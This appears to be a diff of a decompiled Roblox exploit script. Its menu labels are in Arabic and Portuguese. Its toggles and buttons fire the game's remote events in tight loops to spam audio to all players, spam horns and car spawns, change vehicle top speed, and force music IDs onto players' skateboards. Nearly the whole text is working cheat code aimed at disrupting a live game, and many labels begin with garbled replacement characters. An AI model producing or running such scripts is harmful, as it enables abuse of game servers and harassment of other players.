+        if not _Audioallclient then
+            _Audioallclient = Instance.new('Folder')
+            _Audioallclient.Name = 'Audio all client'
+            _Audioallclient.Parent = workspace
+        end
+
+        return _Audioallclient
+    end
+
+    (function(p659)
+        if type(p659) ~= 'number' then
+            print('Insira um n\u{fa}mero v\u{e1}lido!')
+
+            return nil
+        end
+
+        local v660 = u658()
+
+        if v660 then
+            local _Sound2 = Instance.new('Sound')
+
+            _Sound2.SoundId = 'rbxassetid://' .. p659
+            _Sound2.Volume = 1
+            _Sound2.Looped = false
+            _Sound2.Parent = v660
+
+            _Sound2:Play()
+            task.wait(1)
+            _Sound2:Destroy()
+        end
+    end)(p656)
+end
+local function u665(p663)
+    if type(p663) ~= 'number' then
+        print('Insira um n\u{fa}mero v\u{e1}lido!')
+
+        return nil
+    end
+
+    local __1Gu1nSound1s = _ReplicatedStorage8:FindFirstChild('1Gu1nSound1s', true)
+
+    if __1Gu1nSound1s then
+        __1Gu1nSound1s:FireServer(workspace, p663, 1)
+    end
+end
+
+v623:AddToggle({
+    Name = '\u{fffd}\u{648}\u{62a} \u{642}\u{648}\u{64a} \u{648}\u{64a}\u{62e}\u{631}\u{628} \u{633}\u{64a}\u{631}\u{641}\u{631} \u{628}\u{62f}\u{648}\u{646} \u{62a}\u{648}\u{642}\u{641}',
+    Description = 'Toca \u{e1}udio repetidamente para todos',
+    Default = false,
+    Flag = 'audio_spam',
+    Callback = function(p666)
+        getgenv().Audio_All_loop_fast = p666
+
+        while getgenv().Audio_All_loop_fast do
+            u665(u655)
+            task.spawn(function()
+                u662(u655)
+            end)
+            task.wait(0.03)
+        end
+    end,
+})
+
+local v667 = v71:MakeTab({
+    Name = '\u{fffd}\u{644}\u{633}\u{64a}\u{627}\u{631}\u{629}',
+    Icon = 'rbxassetid://115714662895227',
+    PremiumOnly = false,
+})
+
+v667:AddSection({
+    Name = '\u{fffd}\u{64a}\u{627}\u{62f}\u{629} \u{633}\u{631}\u{639}\u{629} \u{627}\u{644}\u{633}\u{64a}\u{627}\u{631}\u{629}',
+})
+v667:AddTextbox({
+    Name = '\u{fffd}\u{62f}\u{62e}\u{644} \u{633}\u{631}\u{639}\u{629} \u{627}\u{644}\u{633}\u{64a}\u{627}\u{631}\u{629}',
+    Default = '',
+    TextDisappear = false,
+    Callback = function(p668)
+        local _LocalPlayer16 = game.Players.LocalPlayer
+        local v670 = workspace.Vehicles:FindFirstChild(_LocalPlayer16.Name .. 'Car')
+        local v671 = tonumber(p668)
+
+        if v671 and (0 <= v671 and (v671 <= 500 and v670)) then
+            v670.Body.VehicleSeat.TopSpeed.Value = v671
+        end
+    end,
+})
+v667:AddLabel(' \u{645}\u{644}\u{627}\u{62d}\u{636}\u{629}: \u{62d}\u{62f} \u{627}\u{644}\u{627}\u{642}\u{635}\u{649} \u{644}\u{633}\u{631}\u{639}\u{629} \u{627}\u{644}\u{633}\u{64a}\u{627}\u{631}\u{629} \u{647}\u{64a} 200');
+(function(p672)
+    p672:AddTextbox({
+        Name = '\u{fffd}\u{62f}\u{62e}\u{644} \u{643}\u{648}\u{62f} \u{627}\u{644}\u{627}\u{63a}\u{646}\u{64a}\u{629} \u{644}\u{62a}\u{634}\u{63a}\u{64a}\u{644}\u{647}\u{627}',
+        Default = '',
+        TextDisappear = false,
+        Callback = function(p673)
+            playCarMusic(p673)
+            playScooterMusic(p673)
+            playHouseMusic(p673)
+        end,
+    })
+    p672:AddDropdown({
+        Name = '\u{fffd}\u{62e}\u{62a}\u{627}\u{631} \u{627}\u{644}\u{627}\u{63a}\u{646}\u{64a}\u{629}',
+        Options = musicIds,
+        Callback = function(p674)
+            playCarMusic(p674)
+            playScooterMusic(p674)
+            playHouseMusic(p674)
+        end,
+    })
+end)(v667)
+v667:AddSection({
+    Name = '\u{fffd}\u{635}\u{627}\u{626}\u{635} \u{633}\u{64a}\u{627}\u{631}\u{629}',
+})
+v667:AddToggle({
+    Name = '\u{fffd}\u{64a}\u{627}\u{631}\u{629} \u{645}\u{644}\u{648}\u{646}\u{629}',
+    Default = false,
+    Callback = function(p675)
+        u633 = p675
+
+        if u633 then
+            u636 = coroutine.create(u622)
+
+            coroutine.resume(u636)
+        end
+    end,
+})
+
+local u676 = {
+    'Horn',
+}
+local __1Player1sCa1r2 = game:GetService('ReplicatedStorage'):WaitForChild('RE'):WaitForChild('1Player1sCa1r')
+local u678 = false
+
+local function u679()
+    while u678 do
+        __1Player1sCa1r2:FireServer(unpack(u676))
+        wait(0.1)
+    end
+end
+
+v667:AddToggle({
+    Name = '\u{fffd}\u{628}\u{627}\u{645} \u{647}\u{648}\u{631}\u{646}',
+    Default = false,
+    Callback = function(p680)
+        u678 = p680
+
+        if u678 then
+            spawn(u679)
+        end
+    end,
+})
+
+local u681 = {
+    'SchoolBus',
+    'SmartCar',
+    'FarmTruck',
+    'Cadillac',
+    'Excavator',
+    'Jeep',
+    'NascarTruck',
+    'TowTruck',
+    'Snowplow',
+    'MilitaryTruck',
+    'Tank',
+    'Limo',
+    'FireTruck',
+}
+local u682 = false
+
+local function u684(p683)
+    game:GetService('ReplicatedStorage'):WaitForChild('RE'):WaitForChild('1Ca1r'):FireServer(unpack({
+        'PickingCar',
+        p683,
+    }))
+end
+
+v667:AddToggle({
+    Name = '\u{fffd}\u{628}\u{627}\u{645} \u{633}\u{64a}\u{627}\u{631}\u{627}\u{62a}',
+    Default = false,
+    Callback = function(p685)
+        u682 = p685
+
+        if u682 then
+            task.spawn(function()
+                while u682 do
+                    local v686, v687, v688 = ipairs(u681)
+
+                    while true do
+                        local v689
+
+                        v688, v689 = v686(v687, v688)
+
+                        if v688 == nil or not u682 then
+                            break
+                        end
+
+                        u684(v689)
+                        wait(0.4)
+                    end
+                end
+            end)
+        end
+    end,
+})
+
+local v690 = v71:MakeTab({
+    Name = '\u{fffd}\u{63a}\u{627}\u{646}\u{64a}',
+    Icon = 'rbxassetid://115714662895227',
+})
+
+v690:AddSection({
+    Name = '\u{fffd}\u{63a}\u{640}\u{627}\u{646}\u{64a} \u{628}\u{648}\u{643}\u{633} ',
+})
+v690:AddTextbox({
+    Name = '\u{fffd}\u{62f}\u{62e}\u{644} \u{643}\u{648}\u{62f} \u{627}\u{644}\u{627}\u{63a}\u{646}\u{64a}\u{629}',
+    Default = '',
+    PlaceholderText = '\u{fffd}\u{62f}\u{62e}\u{644} \u{627}\u{644}\u{627}\u{63a}\u{646}\u{64a}\u{647} \u{633}\u{643}\u{64a}\u{62a} \u{628}\u{648}\u{631}\u{62f}',
+    ClearText = true,
+    Callback = function(p691)
+        game:GetService('ReplicatedStorage'):WaitForChild('RE'):WaitForChild('1NoMoto1rVehicle1s'):FireServer(unpack({
+            'SkateBoard',
+        }))
+        game:GetService('ReplicatedStorage'):WaitForChild('RE'):WaitForChild('1NoMoto1rVehicle1s'):FireServer(unpack({
+            'PickingScooterMusicText',
+            p691,
+        }))
+    end,
+})
+v690:AddSection({
+    Name = '\u{fffd}\u{63a}\u{640}\u{627}\u{646}\u{64a} \u{62c}\u{62f}\u{64a}\u{62f}\u{627}\u{62a} ',
+})
+v690:AddButton({
+    Name = 'I love you so',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE:FindFirstChild('1NoMoto1rVehicle1s'):FireServer(unpack({
+            'SkateBoard',
+        }))
+        game:GetService('ReplicatedStorage').RE:FindFirstChild('1NoMoto1rVehicle1s'):FireServer(unpack({
+            'PickingScooterMusicText',
+            '100697759026652',
+        }))
+    end,
+})
+v690:AddButton({
+    Name = 'FUNK1',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE:FindFirstChild('1NoMoto1rVehicle1s'):FireServer(unpack({
+            'SkateBoard',
+        }))
+        game:GetService('ReplicatedStorage').RE:FindFirstChild('1NoMoto1rVehicle1s'):FireServer(unpack({
+            'PickingScooterMusicText',
+            '81520732359105',
+        }))
+    end,
+})
+v690:AddButton({
+    Name = 'FUNK2',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE:FindFirstChild('1NoMoto1rVehicle1s'):FireServer(unpack({
+            'SkateBoard',
+        }))
+        game:GetService('ReplicatedStorage').RE:FindFirstChild('1NoMoto1rVehicle1s'):FireServer(unpack({
+            'PickingScooterMusicText',
+            '100697759026652',
+        }))
+    end,
+})
+v690:AddSection({
+    Name = '\u{fffd}\u{63a}\u{640}\u{627}\u{646}\u{64a} \u{639}\u{631}\u{628}\u{640}\u{64a}\u{629} ',
+})
+v690:AddButton({
+    Name = '\u{fffd}\u{631}\u{627}\u{642}\u{64a}1',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE:FindFirstChild('1NoMoto1rVehicle1s'):FireServer(unpack({
+            'SkateBoard',
+        }))
+        game:GetService('ReplicatedStorage').RE:FindFirstChild('1NoMoto1rVehicle1s'):FireServer(unpack({
+            'PickingScooterMusicText',
+            '119630965566559',
+        }))
+    end,
+})
+v690:AddButton({
+    Name = '\u{fffd}\u{631}\u{627}\u{642}\u{64a}2',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE:FindFirstChild('1NoMoto1rVehicle1s'):FireServer(unpack({
+            'SkateBoard',
+        }))
+        game:GetService('ReplicatedStorage').RE:FindFirstChild('1NoMoto1rVehicle1s'):FireServer(unpack({
+            'PickingScooterMusicText',
+            '119437864395329',
+        }))
+    end,
+})
+v690:AddButton({
+    Name = '\u{fffd}\u{631}\u{627}\u{642}\u{64a}3',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE:FindFirstChild('1NoMoto1rVehicle1s'):FireServer(unpack({
+            'SkateBoard',
+        }))
+        game:GetService('ReplicatedStorage').RE:FindFirstChild('1NoMoto1rVehicle1s'):FireServer(unpack({
+            'PickingScooterMusicText',
+            '111256095783364',
+        }))
+    end,
+})
+v690:AddButton({
+    Name = '\u{fffd}\u{631}\u{627}\u{642}\u{64a}4',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE:FindFirstChild('1NoMoto1rVehicle1s'):FireServer(unpack({
+            'SkateBoard',
+        }))
+        game:GetService('ReplicatedStorage').RE:FindFirstChild('1NoMoto1rVehicle1s'):FireServer(unpack({
+            'PickingScooterMusicText',
+            '80039364766636',
+        }))
+    end,
+})
+v690:AddButton({
+    Name = '5\u{639}\u{631}\u{627}\u{642}\u{64a}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE:FindFirstChild('1NoMoto1rVehicle1s'):FireServer(unpack({
+            'SkateBoard',
+        }))
+        game:GetService('ReplicatedStorage').RE:FindFirstChild('1NoMoto1rVehicle1s'):FireServer(unpack({
+            'PickingScooterMusicText',
+            '122774951440401',
+        }))
+    end,
+})
+v690:AddButton({
+    Name = '\u{fffd}\u{63a}\u{646}\u{640}\u{64a}\u{629} \u{639}\u{631}\u{628}\u{640}\u{64a}\u{629} \u{62d}\u{640}\u{644}\u{648}\u{647}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE:FindFirstChild('1NoMoto1rVehicle1s'):FireServer(unpack({
+            'SkateBoard',
+        }))
+        game:GetService('ReplicatedStorage').RE:FindFirstChild('1NoMoto1rVehicle1s'):FireServer(unpack({
+            'PickingScooterMusicText',
+            '93620598835551',
+        }))
+    end,
+})
+v690:AddButton({
+    Name = '\u{fffd}\u{63a}\u{646}\u{640}\u{64a}\u{629} \u{639}\u{631}\u{628}\u{640}\u{64a}\u{629} 2',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE:FindFirstChild('1NoMoto1rVehicle1s'):FireServer(unpack({
+            'SkateBoard',
+        }))
+        game:GetService('ReplicatedStorage').RE:FindFirstChild('1NoMoto1rVehicle1s'):FireServer(unpack({
+            'PickingScooterMusicText',
+            '1836685732',
+        }))
+    end,
+})
+v690:AddButton({
+    Name = '\u{fffd}\u{63a}\u{646}\u{640}\u{64a}\u{629} \u{639}\u{631}\u{628}\u{640}\u{64a}\u{629} 3',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE:FindFirstChild('1NoMoto1rVehicle1s'):FireServer(unpack({
+            'SkateBoard',
+        }))
+        game:GetService('ReplicatedStorage').RE:FindFirstChild('1NoMoto1rVehicle1s'):FireServer(unpack({
+            'PickingScooterMusicText',
+            '106633496198864',
+        }))
+    end,
+})
+v690:AddButton({
+    Name = '\u{fffd}\u{640}\u{632}\u{641} \u{62d}\u{640}\u{632}\u{64a}\u{646}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE:FindFirstChild('1NoMoto1rVehicle1s'):FireServer(unpack({
+            'SkateBoard',
+        }))
+        game:GetService('ReplicatedStorage').RE:FindFirstChild('1NoMoto1rVehicle1s'):FireServer(unpack({
+            'PickingScooterMusicText',
+            '135308045',
+        }))
+    end,
+})
+v690:AddButton({
+    Name = '\u{fffd}\u{645}\u{640}\u{634}\u{648}\u{646}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE:FindFirstChild('1NoMoto1rVehicle1s'):FireServer(unpack({
+            'SkateBoard',
+        }))
+        game:GetService('ReplicatedStorage').RE:FindFirstChild('1NoMoto1rVehicle1s'):FireServer(unpack({
+            'PickingScooterMusicText',
+            '133188753831517',
+        }))
+    end,
+})
+v690:AddButton({
+    Name = '\u{fffd}\u{628}\u{640}\u{6a9}\u{640}\u{647}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE:FindFirstChild('1NoMoto1rVehicle1s'):FireServer(unpack({
+            'SkateBoard',
+        }))
+        game:GetService('ReplicatedStorage').RE:FindFirstChild('1NoMoto1rVehicle1s'):FireServer(unpack({
+            'PickingScooterMusicText',
+            '90807238125839',
+        }))
+    end,
+})
+v690:AddSection({
+    Name = ' \u{627}\u{63a}\u{627}\u{646}\u{640}\u{64a} \u{645}\u{632}\u{639}\u{62c}\u{640}\u{647} ',
+})
+v690:AddButton({
+    Name = '\u{fffd}\u{648}\u{64a}\u{644}\u{64a} \u{639}\u{644}\u{64a}\u{643} \u{62c}\u{64a}\u{633}\u{648}\u{633}\u{633}\u{633}\u{633}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE:FindFirstChild('1NoMoto1rVehicle1s'):FireServer(unpack({
+            'SkateBoard',
+        }))
+        game:GetService('ReplicatedStorage').RE:FindFirstChild('1NoMoto1rVehicle1s'):FireServer(unpack({
+            'PickingScooterMusicText',
+            '78275845721592',
+        }))
+    end,
+})
+v690:AddButton({
+    Name = '\u{fffd}\u{648}\u{62a} \u{645}\u{632}\u{639}\u{62c} \u{639}\u{627}\u{644}\u{64a} \u{62c}\u{62f}\u{622}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE:FindFirstChild('1NoMoto1rVehicle1s'):FireServer(unpack({
+            'SkateBoard',
+        }))
+        game:GetService('ReplicatedStorage').RE:FindFirstChild('1NoMoto1rVehicle1s'):FireServer(unpack({
+            'PickingScooterMusicText',
+            '7764369437',
+        }))
+    end,
+})
